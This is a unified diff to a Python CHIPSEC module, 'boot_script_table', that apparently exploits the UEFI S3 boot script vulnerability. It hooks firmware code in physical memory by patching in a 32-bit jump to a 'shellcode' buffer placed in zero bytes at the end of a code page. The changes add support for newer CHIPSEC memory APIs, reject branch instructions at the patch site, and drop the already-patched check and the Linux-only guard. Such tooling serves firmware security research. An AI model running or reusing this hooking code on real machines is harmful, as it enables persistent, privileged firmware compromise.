@@ -1,9 +1,10 @@
-import sys, os
 from struct import pack, unpack
-from capstone import *
+
 from chipsec.module_common import *
 from chipsec.hal.uefi import *
 from chipsec.hal.physmem import *
+
+import capstone
 
 
 _MODULE_NAME = 'boot_script_table'
@@ -359,19 +360,54 @@ class boot_script_table(BaseModule):
         read_addr = addr & 0xfffffffffffff000
         read_size = size + addr - read_addr
 
-        data = self._memory.read_physical_mem(read_addr, read_size)
+        if hasattr(self._memory, 'read_phys_mem'):
+
+            # for CHIPSEC >= 1.1.7
+            data = self._memory.read_phys_mem(read_addr, read_size)
+
+        elif hasattr(self._memory, 'read_physical_mem'):
+
+            # for older versions
+            data = self._memory.read_physical_mem(read_addr, read_size)
+
+        else: 
+
+            assert False
+
         return data[addr - read_addr:]
 
     def _mem_write(self, addr, data):
 
-        self._memory.write_physical_mem(addr, len(data), data)
+        if hasattr(self._memory, 'write_phys_mem'):
+
+            # for CHIPSEC >= 1.1.7
+            self._memory.write_phys_mem(addr, len(data), data)
+
+        elif hasattr(self._memory, 'write_physical_mem'):
+
+            # for older versions
+            self._memory.write_physical_mem(addr, len(data), data)
+
+        else: 
+
+            assert False
 
     def _disasm(self, data):
 
-        dis = Cs(CS_ARCH_X86, CS_MODE_64)
+        dis = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
+        dis.detail = True
+
         for insn in dis.disasm(data, len(data)): 
 
-            return insn.mnemonic + ' ' + insn.op_str, insn.size
+            if insn.group(capstone.CS_GRP_JUMP) or \
+               insn.group(capstone.CS_GRP_CALL) or \
+               insn.group(capstone.CS_GRP_RET) or \
+               insn.group(capstone.CS_GRP_INT) or \
+               insn.group(capstone.CS_GRP_IRET):
+
+                raise Exception('Unable to patch %s instruction at the beginning of the function' % insn.mnemonic)
+
+            return insn.size
 
     def _jump_32(self, src, dst):
 
@@ -389,9 +425,10 @@ class boot_script_table(BaseModule):
 
     def _find_zero_bytes(self, addr, size):
 
-        addr = (addr & 0xfffff000) + 0x1000
+        max_size, page_size = 0, 0x1000
+        addr = (addr & 0xfffff000) + page_size
 
-        while True:
+        while max_size < 1024 * 1024:
 
             # search for zero bytes at the end of the code page
             if self._mem_read(addr - size, size) == '\0' * size:
@@ -399,16 +436,12 @@ class boot_script_table(BaseModule):
                 addr -= size
                 break
 
-            addr += 0x1000
+            addr += page_size
+            max_size += page_size
 
         return addr
 
     def _hook(self, addr, payload):        
-
-        if self._mem_read(addr, 1) == '\xe9':
-
-            print 'ERROR: Already patched'
-            return None
 
         hook_size = 0
         data = self._mem_read(addr, 0x40)
@@ -416,7 +449,7 @@ class boot_script_table(BaseModule):
         # disassembly instructions and determinate patch length
         while hook_size < self.JUMP_32_LEN:
 
-            mnem, size = self._disasm(data[hook_size:])
+            size = self._disasm(data[hook_size:])
             hook_size += size
         
         print '%d bytes to patch' % hook_size        
@@ -428,7 +461,7 @@ class boot_script_table(BaseModule):
         buff_size = len(payload) + hook_size + self.JUMP_32_LEN
         buff_addr = self._find_zero_bytes(addr, buff_size)
 
-        print 'Found %d zero bytes at 0x%x' % (buff_size, buff_addr)
+        print 'Found %d zero bytes for shellcode at 0x%x' % (buff_size, buff_addr)
 
         # write payload + original bytes + jump back to hooked function
         buff = payload + data + \
@@ -543,12 +576,6 @@ class boot_script_table(BaseModule):
         return ModuleResult.ERROR        
 
     def is_supported(self):
-
-        supported = 'linux' in sys.platform
-        if not supported:
-
-            print '[!] boot_script_table module is linux-only'
-            return False
 
         return True
 
